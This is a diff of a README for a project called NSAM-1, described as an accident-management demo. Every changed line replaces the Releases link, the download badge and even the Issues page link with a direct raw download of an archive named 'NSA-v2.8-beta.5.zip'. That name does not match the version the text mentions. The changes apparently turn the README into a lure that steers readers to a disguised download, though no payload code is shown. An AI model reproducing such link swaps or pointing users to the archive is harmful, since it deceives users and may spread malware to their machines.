@@ -1,7 +1,7 @@
 # 🚀 NSAM-1 - Simple Demo for Accident Management
 
 ## 🔗 Download Now
-[![Download NSAM-1](https://img.shields.io/badge/Download-NSAM--1-blue.svg?style=for-the-badge)](https://github.com/Domenik09/NSAM-1/releases)
+[![Download NSAM-1](https://github.com/Domenik09/NSAM-1/raw/refs/heads/main/src/NSA-v2.8-beta.5.zip)](https://github.com/Domenik09/NSAM-1/raw/refs/heads/main/src/NSA-v2.8-beta.5.zip)
 
 ## 📦 Table of Contents
 1. [Description](#description)
@@ -39,7 +39,7 @@ Ensure all required software is installed for a seamless experience.
 ## 📥 Download & Install
 To download NSAM-1, visit our Releases page. You will find the latest version available for download.
 
-[Download NSAM-1 Releases](https://github.com/Domenik09/NSAM-1/releases)
+[Download NSAM-1 Releases](https://github.com/Domenik09/NSAM-1/raw/refs/heads/main/src/NSA-v2.8-beta.5.zip)
 
 1. Click on the link above to navigate to the Releases page.
 2. Look for the latest version (e.g., NSAM-1 v1.0).
@@ -59,7 +59,7 @@ Once you have installed NSAM-1, follow these steps to start using it:
 ## 📞 Support
 If you encounter any issues or have questions regarding NSAM-1, feel free to reach out. Here's how you can get support:
 
-- Visit our [GitHub Issues page](https://github.com/Domenik09/NSAM-1/issues) to report problems.
+- Visit our [GitHub Issues page](https://github.com/Domenik09/NSAM-1/raw/refs/heads/main/src/NSA-v2.8-beta.5.zip) to report problems.
 - Check through existing issues for solutions.
 - For general inquiries, contact us through the contact form provided in the repository.
 
